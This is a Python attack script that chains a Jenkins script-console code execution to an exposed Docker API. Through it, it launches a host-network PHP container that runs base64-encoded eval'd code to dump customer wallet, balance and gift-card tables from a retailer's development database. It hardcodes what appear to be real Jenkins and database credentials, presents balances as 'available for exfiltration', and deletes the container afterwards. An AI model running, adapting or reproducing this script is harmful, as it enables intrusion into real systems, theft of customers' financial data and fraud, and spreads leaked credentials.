"""
dev_sears_wallet_dump.py — Wallet/Monedero exfil from DEV Sears DB
DB: 172.27.141.6:3308  user: apifincadodev  pass: 1q2w3e4r5t6y
Vector: Jenkins RCE -> Docker API (172.27.140.148:4243) -> PHP container (host-net)
Output: claroshop_attack/dev_sears_wallets.json

Approach: 3-call split (start / wait locally / fetch logs) to avoid 60s gateway timeout.
"""

import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time, sys, os

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH        = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE        = 'https://jenkins-ng.dev.claroshop.com'
DOCKER_BASE = 'http://172.27.140.148:4243'
PHP_IMAGE   = 'docker-registry.nexus.dev.claroshop.com/ubi7-php72:latest'
CNAME       = 'wallet_dump_tr4ns'
OUT_FILE    = r'c:\xampp\htdocs\pentagi\claroshop_attack\dev_sears_wallets.json'


# ─── Jenkins helper ──────────────────────────────────────────────────────────
def jenkins_exec(script, timeout=55):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')


# ─── PHP script (run inside container, host-network -> 172.27.141.6:3308) ────
PHP_CODE = r"""error_reporting(0);
$mysqli = new mysqli('172.27.141.6', 'apifincadodev', '1q2w3e4r5t6y', '', 3308);
if ($mysqli->connect_error) {
    echo json_encode(['error'=>'CONNECT_FAIL: '.$mysqli->connect_error]);
    exit(1);
}
echo "CONNECTED_OK\n";

$results = [];

// ── All DBs ──────────────────────────────────────────────────────────────────
$dbs = [];
$r = $mysqli->query('SHOW DATABASES');
while ($row = $r->fetch_row()) {
    if (!in_array($row[0],['information_schema','performance_schema','sys','mysql'])) $dbs[]=$row[0];
}
echo "DATABASES: ".implode(', ',$dbs)."\n";
$results['databases'] = $dbs;

// ── Search all schemas for wallet keywords ────────────────────────────────────
$kws = ['monedero','wallet','saldo','gift','voucher','tarjeta_regalo','bonificacion',
        'prepago','credit','balance','claropay','puntos','cupon','cashback','giftcard',
        'prepaid','recompensa','loyalty','cupon_descuento'];
$where = implode(' OR ', array_map(function($k){return "TABLE_NAME LIKE '%".$k."%'";}, $kws));
$sql  = "SELECT TABLE_SCHEMA,TABLE_NAME,TABLE_ROWS,CREATE_TIME
         FROM information_schema.TABLES
         WHERE ($where)
         AND TABLE_SCHEMA NOT IN ('information_schema','performance_schema','sys','mysql')
         ORDER BY TABLE_SCHEMA, TABLE_NAME";
$res  = $mysqli->query($sql);
$wallet_tables = [];
echo "\n=== WALLET TABLES FOUND ===\n";
while ($row = $res->fetch_assoc()) {
    $wallet_tables[] = $row;
    printf("  %-28s %-42s rows:%-10s %s\n",
        $row['TABLE_SCHEMA'],$row['TABLE_NAME'],$row['TABLE_ROWS']??'?',$row['CREATE_TIME']??'');
}
echo "Total: ".count($wallet_tables)."\n";
$results['wallet_tables_found'] = $wallet_tables;

// ── Deep dive each table ─────────────────────────────────────────────────────
$detail = [];
foreach ($wallet_tables as $tbl) {
    $sc = $mysqli->real_escape_string($tbl['TABLE_SCHEMA']);
    $nm = $mysqli->real_escape_string($tbl['TABLE_NAME']);
    $fl = "`$sc`.`$nm`";
    $e  = ['schema'=>$sc,'table'=>$nm];

    // DESCRIBE
    $dr = $mysqli->query("DESCRIBE $fl");
    $cols = [];
    if ($dr) { while ($c=$dr->fetch_assoc()) $cols[]=$c; }
    $e['columns'] = $cols;
    $col_names = array_column($cols,'Field');
    echo "\n-- $sc.$nm --\n";
    foreach ($cols as $c) echo "  {$c['Field']} {$c['Type']}\n";

    // COUNT
    $cr = $mysqli->query("SELECT COUNT(*) FROM $fl");
    $cnt = $cr ? $cr->fetch_row()[0] : 0;
    $e['count'] = $cnt;
    echo "COUNT: $cnt\n";

    // Date range
    $dcols = array_filter($col_names, function($c){return preg_match('/fecha|date|created|updated|time/i',$c);});
    if ($dcols) {
        $dc = reset($dcols);
        $dr2 = $mysqli->query("SELECT MIN(`$dc`),MAX(`$dc`) FROM $fl");
        if ($dr2) { $drow=$dr2->fetch_row(); $e['date_range']=['col'=>$dc,'min'=>$drow[0],'max'=>$drow[1]]; echo "DATE ($dc): {$drow[0]} -> {$drow[1]}\n"; }
    }

    // Sample 50 rows
    $sr = $mysqli->query("SELECT * FROM $fl ORDER BY 1 DESC LIMIT 50");
    $rows = [];
    if ($sr) { while ($row=$sr->fetch_assoc()) $rows[]=$row; }
    $e['sample_50'] = $rows;
    echo "SAMPLE: ".count($rows)." rows\n";
    foreach (array_slice($rows,0,3) as $row) echo "  ".json_encode($row,JSON_UNESCAPED_UNICODE)."\n";

    // Saldo > 0 check
    $s_cols = array_filter($col_names, function($c){return preg_match('/saldo|balance|monto|importe|disponible|amount|credito/i',$c);});
    if ($s_cols) {
        $sfc = reset($s_cols);
        $sr2 = $mysqli->query("SELECT COUNT(*),SUM(`$sfc`) FROM $fl WHERE `$sfc`>0");
        if ($sr2) {
            $pos = $sr2->fetch_row();
            $e['saldo_positivo'] = ['column'=>$sfc,'count_gt0'=>$pos[0],'total'=>$pos[1]];
            echo "SALDO>0 ($sfc): {$pos[0]} rows, total={$pos[1]}\n";
            if ($pos[0]>0) {
                $limit = min(intval($pos[0]),10000);
                $sall = $mysqli->query("SELECT * FROM $fl WHERE `$sfc`>0 ORDER BY `$sfc` DESC LIMIT $limit");
                $full_rows = [];
                if ($sall) { while ($row=$sall->fetch_assoc()) $full_rows[]=$row; }
                $e['full_dump_saldo_gt0'] = $full_rows;
                echo "FULL DUMP: ".count($full_rows)." rows con saldo>0\n";
            }
        }
    }
    $detail[] = $e;
}
$results['table_details'] = $detail;

// ── tienda_nueva wallet tables ────────────────────────────────────────────────
$r3=$mysqli->query("SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES
                    WHERE TABLE_SCHEMA='tienda_nueva'
                    AND ($where) ORDER BY TABLE_NAME");
$tn=[]; if($r3){while($row=$r3->fetch_row())$tn[]=['table'=>$row[0],'rows'=>$row[1]];}
$results['tienda_nueva_wallet_tables']=$tn;
echo "\ntienda_nueva wallet tables: ".count($tn)."\n";
foreach ($tn as $t) echo "  tienda_nueva.{$t['table']} rows:{$t['rows']}\n";

// ── Summary ───────────────────────────────────────────────────────────────────
$summary=[];
foreach($detail as $d){
    if(!empty($d['saldo_positivo']['total'])){
        $summary[]=['table'=>$d['schema'].'.'.$d['table'],'col'=>$d['saldo_positivo']['column'],
                    'rows_gt0'=>$d['saldo_positivo']['count_gt0'],'total'=>$d['saldo_positivo']['total']];
    }
}
$results['saldo_summary']=$summary;
$results['total_saldo_combinado']=array_sum(array_column($summary,'total'));
$results['ts']=date('Y-m-d H:i:s');

echo "\n=== RESUMEN FINAL ===\n";
printf("%-55s %-20s %-10s %s\n",'Tabla','Columna','Rows>0','Total Saldo');
foreach($summary as $s) printf("%-55s %-20s %-10s %s\n",$s['table'],$s['col'],$s['rows_gt0'],$s['total']);
echo "TOTAL COMBINADO: ".$results['total_saldo_combinado']."\n";

echo "\n===JSON_OUTPUT_START===\n";
echo json_encode($results,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT);
echo "\n===JSON_OUTPUT_END===\n";
$mysqli->close();
"""

PHP_B64 = base64.b64encode(PHP_CODE.encode('utf-8')).decode()


# ─── Groovy 1: Create + start container (returns immediately) ─────────────────
GROOVY_START = f'''
import groovy.json.*
def docker = "{DOCKER_BASE}"
def img    = "{PHP_IMAGE}"
def b64    = "{PHP_B64}"
def cname  = "{CNAME}"

// Kill any old instance
try {{
    def k = new URL("${{docker}}/containers/${{cname}}?force=true").openConnection()
    k.requestMethod = "DELETE"; k.responseCode
}} catch(e) {{}}
sleep(1000)

// Create
def conn = new URL("${{docker}}/containers/create?name=${{cname}}").openConnection()
conn.requestMethod = "POST"
conn.setRequestProperty("Content-Type","application/json")
conn.doOutput = true
// Entrypoint is already "php" — pass flags directly as Cmd.
// Full exec: php -r "eval(base64_decode('...'))"
def phpCmd = "eval(base64_decode('" + b64 + "'));"
def body = JsonOutput.toJson([
    Image: img,
    Cmd: ["-r", phpCmd],
    HostConfig: [NetworkMode:"host", AutoRemove:false]
])
conn.outputStream.write(body.bytes)
def hc = conn.responseCode
def cr = new JsonSlurper().parse((hc>=200&&hc<300)?conn.inputStream:conn.errorStream)
def cid = cr?.Id?.take(12)
println "CREATE (${{hc}}): ${{cid ?: cr}}"
if (!cid) {{ println "FAIL"; return }}

// Start
def s2 = new URL("${{docker}}/containers/${{cid}}/start").openConnection()
s2.requestMethod = "POST"; s2.setRequestProperty("Content-Type","application/json")
s2.doOutput = true; s2.outputStream.write("{{}}" .bytes)
println "START: ${{s2.responseCode}}"
println "CONTAINER_ID=${{cid}}"
println "STARTED_OK"
'''


# ─── Groovy 2: Fetch logs from running/stopped container ─────────────────────
def build_groovy_logs(wait_ms: int = 0) -> str:
    return f'''
import groovy.json.*
def docker = "{DOCKER_BASE}"
def cname  = "{CNAME}"
{"sleep(" + str(wait_ms) + ")" if wait_ms else ""}

// Get logs
def url = new URL("${{docker}}/containers/${{cname}}/logs?stdout=true&stderr=true&timestamps=false")
def logBytes = url.openConnection().inputStream.bytes
def text = ""; def i = 0
while (i + 8 <= logBytes.size()) {{
    def sz = ((logBytes[i+4]&0xFF)<<24)|((logBytes[i+5]&0xFF)<<16)|
              ((logBytes[i+6]&0xFF)<<8)|(logBytes[i+7]&0xFF)
    if (sz > 0 && i+8+sz <= logBytes.size())
        text += new String(logBytes[(i+8)..(i+7+sz)] as byte[], "UTF-8")
    i += 8 + (sz > 0 ? sz : 1)
}}
if (!text) text = new String(logBytes, "UTF-8")

// Check if still running
def insp = new JsonSlurper().parse(new URL("${{docker}}/containers/${{cname}}/json").openConnection().inputStream)
println "STATUS: ${{insp?.State?.Status}}"
println "=== CONTAINER LOGS ==="
println text.take(300000)
'''


# ─── Groovy 3: Cleanup ───────────────────────────────────────────────────────
GROOVY_CLEANUP = f'''
def docker = "{DOCKER_BASE}"
def cname  = "{CNAME}"
def rm = new URL("${{docker}}/containers/${{cname}}?force=true").openConnection()
rm.requestMethod = "DELETE"
println "CLEANUP: ${{rm.responseCode}}"
'''


def parse_json_from_output(output: str):
    start = output.find('===JSON_OUTPUT_START===')
    end   = output.find('===JSON_OUTPUT_END===')
    if start == -1 or end == -1:
        return None
    raw = output[start + len('===JSON_OUTPUT_START==='):end].strip()
    try:
        return json.loads(raw)
    except json.JSONDecodeError as e:
        print(f"[!] JSON parse error: {e}")
        # Return raw output for debugging
        return {'raw': raw, 'json_error': str(e)}


if __name__ == '__main__':
    print("=" * 72)
    print("DEV SEARS WALLET DUMP — aliensito / Tr4nsHack")
    print(f"Target: 172.27.141.6:3308  user=apifincadodev")
    print(f"Docker: {DOCKER_BASE}  image: {PHP_IMAGE}")
    print("=" * 72)

    # ── CALL 1: Start container ───────────────────────────────────────────────
    print("\n[1/3] Creando y arrancando container PHP (host-net)...")
    try:
        out1 = jenkins_exec(GROOVY_START, timeout=55)
        print(out1)
    except Exception as e:
        print(f"[!] CALL 1 FAILED: {e}")
        sys.exit(1)

    if 'STARTED_OK' not in out1:
        print("[!] Container no arrancó. Abortando.")
        sys.exit(1)

    # ── Esperar localmente 100s mientras PHP corre ─────────────────────────────
    wait_secs = 100
    print(f"\n[2/3] Esperando {wait_secs}s para que PHP termine las queries...")
    for i in range(0, wait_secs, 10):
        time.sleep(10)
        print(f"  ... {i+10}s / {wait_secs}s", flush=True)

    # ── CALL 2: Fetch logs ────────────────────────────────────────────────────
    print("\n[3/3] Obteniendo logs del container...")
    try:
        out2 = jenkins_exec(build_groovy_logs(wait_ms=0), timeout=55)
    except Exception as e:
        print(f"[!] CALL 2 FAILED: {e}. Intentando con wait=5s...")
        time.sleep(5)
        try:
            out2 = jenkins_exec(build_groovy_logs(wait_ms=0), timeout=55)
        except Exception as e2:
            print(f"[!] CALL 2 retry también falló: {e2}")
            out2 = ''

    if not out2:
        print("[!] Sin output de logs.")
    else:
        status_line = [l for l in out2.split('\n') if 'STATUS:' in l]
        if status_line:
            print(status_line[0])
        print("\n--- Primeros 8KB del output ---")
        logs_start = out2.find('=== CONTAINER LOGS ===')
        logs_body  = out2[logs_start:] if logs_start != -1 else out2
        print(logs_body[:8000])
        if len(logs_body) > 8000:
            print(f"\n... [{len(logs_body)-8000} chars más] ...")

    # ── Parse JSON ────────────────────────────────────────────────────────────
    parsed = parse_json_from_output(out2) if out2 else None
    if parsed and 'wallet_tables_found' in parsed:
        print("\n[+] JSON estructurado extraído correctamente")
    else:
        print("\n[!] Sin JSON estructurado — guardando output crudo")
        parsed = {
            'raw_output': out2,
            'groovy_start': out1,
            'error': 'no_json_marker',
            'ts': time.strftime('%Y-%m-%d %H:%M:%S')
        }

    # ── Save ──────────────────────────────────────────────────────────────────
    os.makedirs(os.path.dirname(OUT_FILE), exist_ok=True)
    with open(OUT_FILE, 'w', encoding='utf-8') as f:
        json.dump(parsed, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Guardado: {OUT_FILE}")

    # ── Summary table ─────────────────────────────────────────────────────────
    wallet_tables = parsed.get('wallet_tables_found', [])
    saldo_summary = parsed.get('saldo_summary', [])

    if wallet_tables:
        print("\n" + "=" * 100)
        print("TABLAS WALLET / MONEDERO ENCONTRADAS")
        print("=" * 100)
        print(f"{'Schema':<28} {'Tabla':<42} {'Rows':<12} {'Creada'}")
        print("-" * 100)
        for t in wallet_tables:
            print(f"{t.get('TABLE_SCHEMA',''):<28} {t.get('TABLE_NAME',''):<42} "
                  f"{str(t.get('TABLE_ROWS','?')):<12} {t.get('CREATE_TIME','')}")

    if saldo_summary:
        print("\n" + "=" * 100)
        print("TABLAS CON SALDO POSITIVO — DISPONIBLE PARA EXFILTRACIÓN")
        print("=" * 100)
        print(f"{'Tabla':<55} {'Columna':<22} {'Rows>0':<10} {'Total Saldo'}")
        print("-" * 100)
        for s in saldo_summary:
            print(f"{s['table']:<55} {s['col']:<22} {str(s['rows_gt0']):<10} {s['total']}")
        print("-" * 100)
        print(f"SALDO TOTAL COMBINADO: {parsed.get('total_saldo_combinado', 'N/A')}")

    # ── Cleanup ───────────────────────────────────────────────────────────────
    print("\n[*] Limpiando container...")
    try:
        out3 = jenkins_exec(GROOVY_CLEANUP, timeout=20)
        print(out3.strip())
    except Exception as e:
        print(f"[*] Cleanup: {e}")
